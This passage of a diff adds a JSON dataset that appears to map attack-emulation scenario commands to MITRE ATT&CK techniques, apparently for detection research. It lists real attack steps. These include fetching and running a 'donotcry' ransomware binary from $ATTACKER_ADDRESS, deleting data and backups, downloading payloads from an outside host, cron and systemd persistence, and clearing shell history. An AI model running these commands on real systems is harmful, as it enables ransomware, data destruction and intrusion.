+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1053.003",
+      "T1105",
+      "T1071.001"
+     ],
+     "tactics": [
+      "Persistence",
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1072"
+     ],
+     "tactics": [
+      "Execution",
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1072"
+     ],
+     "tactics": [
+      "Execution",
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1105"
+     ],
+     "tactics": [
+      "Impact",
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1565.001"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "find /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1087.001"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "cat /etc/passwd"
+    },
+    {
+     "techniques": [
+      "T1531"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "userdel -f john"
+    },
+    {
+     "techniques": [
+      "T1485"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /media/data/*"
+    },
+    {
+     "techniques": [
+      "T1490"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /var/backups/*"
+    },
+    {
+     "techniques": [
+      "T1489"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "systemctl stop exim4.service"
+    }
+   ]
+  },
+  "scenario_3_b_d.j2": {
+   "scenario": "S3",
+   "source_path": "scenario_3_b_d.j2",
+   "source_sha256": "586c1bfd1febce2c6592428f4368a0b20435836cbf332bb90d43dea41be49a47",
+   "n_unlabelled_commands": 37,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1110.001",
+      "T1021.005"
+     ],
+     "tactics": [
+      "Credential Access",
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "move"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    },
+    {
+     "techniques": [
+      "T1021.005"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1213"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1039"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1072",
+      "T1105",
+      "T1059.004"
+     ],
+     "tactics": [
+      "Execution",
+      "Lateral Movement"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1105"
+     ],
+     "tactics": [
+      "Impact",
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/donotcry > /opt/donotcry"
+    },
+    {
+     "techniques": [
+      "T1486",
+      "T1565.001"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "find /media/data/Images"
+    },
+    {
+     "techniques": [
+      "T1087.001"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "cat /etc/passwd"
+    },
+    {
+     "techniques": [
+      "T1531"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "userdel -f john"
+    },
+    {
+     "techniques": [
+      "T1485"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /media/data/*"
+    },
+    {
+     "techniques": [
+      "T1490"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "rm -rf /var/backups/*"
+    },
+    {
+     "techniques": [
+      "T1489"
+     ],
+     "tactics": [
+      "Impact"
+     ],
+     "type": "msf-session",
+     "cmd": "systemctl stop exim4.service"
+    }
+   ]
+  },
+  "scenario_4.j2": {
+   "scenario": "S4",
+   "source_path": "scenario_4.j2",
+   "source_sha256": "87e45d14223042a792f36ea4c4bb3a3524edb15a31c53553505e1a2257251ba9",
+   "n_unlabelled_commands": 24,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1071.001"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "sliver",
+     "cmd": "generate_implant"
+    },
+    {
+     "techniques": [
+      "T1071.001"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "sliver",
+     "cmd": "start_https_listener"
+    },
+    {
+     "techniques": [
+      "T1078.003",
+      "T1105",
+      "T1205.001"
+     ],
+     "tactics": [
+      "Initial Access",
+      "Lateral Movement",
+      "Defense Evasion"
+     ],
+     "type": "shell",
+     "cmd": "sshpass -p 'rambo' scp -o StrictHostKeyChecking=no -o ProxyCommand=\"sshpass -p 'rambo' ssh -o StrictHostKeyChecking=no -p 10022 john@$SERVER_ADDRESS nc $FIREWALL_ADDRESS 22\" /home/aecid/auditf.tar.gz "
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@$FIREWALL_ADDRESS\\n"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "rambo\\n"
+    },
+    {
+     "techniques": [
+      "T1548.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "ssh",
+     "cmd": "sudo -i\\n"
+    },
+    {
+     "techniques": [
+      "T1548.003"
+     ],
+     "tactics": [
+      "Privilege Escalation"
+     ],
+     "type": "ssh",
+     "cmd": "rambo\\n"
+    },
+    {
+     "techniques": [
+      "T1036.005",
+      "T1205.001"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "ssh",
+     "cmd": "sudo tar -xzf /tmp/auditf.tar.gz -C /usr/bin\\n"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "ssh",
+     "cmd": "rm /tmp/auditf.tar.gz\\n"
+    },
+    {
+     "techniques": [
+      "T1543.002"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "ssh",
+     "cmd": "[Unit]\\nDescription=Run auditf on boot\\n\\n[Service]\\nExecStart=/usr/bin/auditf\\nWorkingDirectory=/usr/bin\\nRestart=on-failure\\nType=simple\\n\\n[Install]\\nWantedBy=multi-user.target\\n"
+    },
+    {
+     "techniques": [
+      "T1543.002"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "ssh",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1543.002"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "ssh",
+     "cmd": "sudo systemctl daemon-reload\\n"
+    },
+    {
+     "techniques": [
+      "T1543.002"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "ssh",
+     "cmd": "sudo systemctl enable auditf.service\\n"
+    },
+    {
+     "techniques": [
+      "T1543.002"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "ssh",
+     "cmd": "sudo systemctl start auditf.service\\n"
+    },
+    {
+     "techniques": [
+      "T1205.001",
+      "T1071.001",
+      "T1036.005"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Command and Control"
+     ],
+     "type": "shell",
+     "cmd": "/home/aecid/knock-cli -c knock.yaml -r knock-firewall"
+    },
+    {
+     "techniques": [
+      "T1599"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1599"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password john@$LINUXSHARE_ADDRESS\\n"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "rambo\\n"
+    },
+    {
+     "techniques": [
+      "T1082"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "hostname\\n"
+    }
+   ]
+  },
+  "scenario_5.j2": {
+   "scenario": "S5",
+   "source_path": "scenario_5.j2",
+   "source_sha256": "84934c780df063d5e99a4146da8dfa311b20d3888aa309c246a30cfec877886e",
+   "n_unlabelled_commands": 4,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1040",
+      "T1557.002"
+     ],
+     "tactics": [
+      "Discovery",
+      "Credential Access"
+     ],
+     "type": "shell",
+     "cmd": "sudo bettercap -caplet /home/aecid/bettercap.cap"
+    },
+    {
+     "techniques": [
+      "T1040",
+      "T1528"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "shell",
+     "cmd": "sudo /usr/local/share/attackmate/venv/bin/python3 /home/aecid/get_auth.py"
+    },
+    {
+     "techniques": [
+      "T1550.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Lateral Movement"
+     ],
+     "type": "http-client",
+     "cmd": "GET"
+    }
+   ]
+  },
+  "scenario_6_a_a.j2": {
+   "scenario": "S6",
+   "source_path": "scenario_6_a_a.j2",
+   "source_sha256": "040519e31fdce71d8832cbbd65908567c4598f931147e02ff288d5079f54b829",
+   "n_unlabelled_commands": 33,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1105",
+      "T1204.002"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1204.002"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1082"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "sysinfo"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl -o /home/judy/.local/share/firefox/firefox-startup dailynews-wire.com:8083/index"
+    },
+    {
+     "techniques": [
+      "T1574.008",
+      "T1546"
+     ],
+     "tactics": [
+      "Persistence",
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "ln -sf /home/judy/.local/share/firefox/firefox-startup /home/judy/.local/bin/firefox"
+    },
+    {
+     "techniques": [
+      "T1222.002"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x /home/judy/.local/share/firefox/firefox-startup"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl -o /home/judy/.local/bin/task_runner dailynews-wire.com:8082/index"
+    },
+    {
+     "techniques": [
+      "T1115"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "msf-session",
+     "cmd": "xclip -selection clipboard -o"
+    },
+    {
+     "techniques": [
+      "T1564.001"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "cp /tmp/index /home/judy/.index"
+    },
+    {
+     "techniques": [
+      "T1222.002"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x /home/judy/.local/bin/task_runner"
+    },
+    {
+     "techniques": [
+      "T1222.002"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x /home/judy/downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1010"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "wmctrl -l"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "crontab -e"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "*/10 * * * * /home/judy/downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1070.003"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "history -c"
+    }
+   ]
+  },
+  "scenario_6_a_b.j2": {
+   "scenario": "S6",
+   "source_path": "scenario_6_a_b.j2",
+   "source_sha256": "29c0b47f8df37d3b1a560897e84a18b40d9e39ccc51dd08a090a051b4581277d",
+   "n_unlabelled_commands": 34,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1105",
+      "T1204.002"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1204.002"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1082"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "sysinfo"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl -o /home/judy/.local/bin/task_runner dailynews-wire.com:8082/index"
+    },
+    {
+     "techniques": [
+      "T1115"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "msf-session",
+     "cmd": "xclip -selection clipboard -o"
+    },
+    {
+     "techniques": [
+      "T1564.001"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "cp /tmp/index /home/judy/.index"
+    },
+    {
+     "techniques": [
+      "T1222.002"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x /home/judy/.local/bin/task_runner"
+    },
+    {
+     "techniques": [
+      "T1222.002"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x /home/judy/downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1010"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "wmctrl -l"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "crontab -e"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "*/10 * * * * /home/judy/downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "*/5 * * * * /bin/bash -c /home/judy/.index"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1070.003"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "history -c"
+    }
+   ]
+  },
+  "scenario_6_b_a.j2": {
+   "scenario": "S6",
+   "source_path": "scenario_6_b_a.j2",
+   "source_sha256": "112409632b20f42fa12a6c2cd2d66e473ea7f41f4760870faabc99fcb3f15a08",
+   "n_unlabelled_commands": 140,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1204.001",
+      "T1105",
+      "T1566.004"
+     ],
+     "tactics": [
+      "Initial Access",
+      "Execution",
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1204.001",
+      "T1105",
+      "T1566.004"
+     ],
+     "tactics": [
+      "Initial Access",
+      "Execution",
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1204.001",
+      "T1219"
+     ],
+     "tactics": [
+      "Initial Access",
+      "Execution",
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1204.001",
+      "T1219"
+     ],
+     "tactics": [
+      "Initial Access",
+      "Execution",
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1566.004",
+      "T1219"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1566.004",
+      "T1219"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1566.004",
+      "T1219"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1566.004",
+      "T1219"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1219"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1219"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    },
+    {
+     "techniques": [
+      "T1219"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "move"
+    },
+    {
+     "techniques": [
+      "T1219"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1219",
+      "T1564.001"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Execution",
+      "Defense Evasion"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1219",
+      "T1564.001"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Execution",
+      "Defense Evasion"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1222.002",
+      "T1219"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1222.002",
+      "T1219"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1219"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1219"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1222.002",
+      "T1219"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1222.002",
+      "T1219"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1574.008",
+      "T1219"
+     ],
+     "tactics": [
+      "Persistence",
+      "Defense Evasion",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1574.008",
+      "T1219"
+     ],
+     "tactics": [
+      "Persistence",
+      "Defense Evasion",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1574.008",
+      "T1219"
+     ],
+     "tactics": [
+      "Persistence",
+      "Defense Evasion",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1059.004",
+      "T1219"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1059.004",
+      "T1219"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1082"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "sysinfo"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl -o /home/judy/.local/bin/task_runner dailynews-wire.com:8082/index"
+    },
+    {
+     "techniques": [
+      "T1115"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "msf-session",
+     "cmd": "xclip -selection clipboard -o"
+    },
+    {
+     "techniques": [
+      "T1222.002"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x /home/judy/.local/bin/task_runner"
+    },
+    {
+     "techniques": [
+      "T1222.002"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x /home/judy/downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1010"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "wmctrl -l"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "crontab -e"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "*/10 * * * * /home/judy/downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1070.003"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "history -c"
+    }
+   ]
+  },
+  "scenario_6_b_b.j2": {
+   "scenario": "S6",
+   "source_path": "scenario_6_b_b.j2",
+   "source_sha256": "114d2ef240e1ee9aad0048c4f928fdf87f4bf7055fbcb1e12ae9361fe78e49f5",
+   "n_unlabelled_commands": 132,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1204.001",
+      "T1105",
+      "T1566.004"
+     ],
+     "tactics": [
+      "Initial Access",
+      "Execution",
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1204.001",
+      "T1105",
+      "T1566.004"
+     ],
+     "tactics": [
+      "Initial Access",
+      "Execution",
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1204.001",
+      "T1219"
+     ],
+     "tactics": [
+      "Initial Access",
+      "Execution",
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1204.001",
+      "T1219"
+     ],
+     "tactics": [
+      "Initial Access",
+      "Execution",
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1566.004",
+      "T1219"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1566.004",
+      "T1219"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1566.004",
+      "T1219"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1566.004",
+      "T1219"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1219"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1219"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    },
+    {
+     "techniques": [
+      "T1219"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "move"
+    },
+    {
+     "techniques": [
+      "T1219"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "vnc",
+     "cmd": "click"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1219",
+      "T1564.001"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Execution",
+      "Defense Evasion"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1219",
+      "T1564.001"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Execution",
+      "Defense Evasion"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1222.002",
+      "T1219"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1222.002",
+      "T1219"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1219",
+      "T1059.004"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "type"
+    },
+    {
+     "techniques": [
+      "T1219",
+      "T1059.004"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Execution"
+     ],
+     "type": "vnc",
+     "cmd": "key"
+    },
+    {
+     "techniques": [
+      "T1082"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "sysinfo"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "curl -o /home/judy/.local/bin/task_runner dailynews-wire.com:8082/index"
+    },
+    {
+     "techniques": [
+      "T1115"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "msf-session",
+     "cmd": "xclip -selection clipboard -o"
+    },
+    {
+     "techniques": [
+      "T1222.002"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x /home/judy/.local/bin/task_runner"
+    },
+    {
+     "techniques": [
+      "T1222.002"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x /home/judy/downloader.sh"
+    },
+    {
+     "techniques": [
+      "T1010"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "wmctrl -l"
+    },
+    {
+     "techniques": [
+      "T1053.003"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "crontab -e"
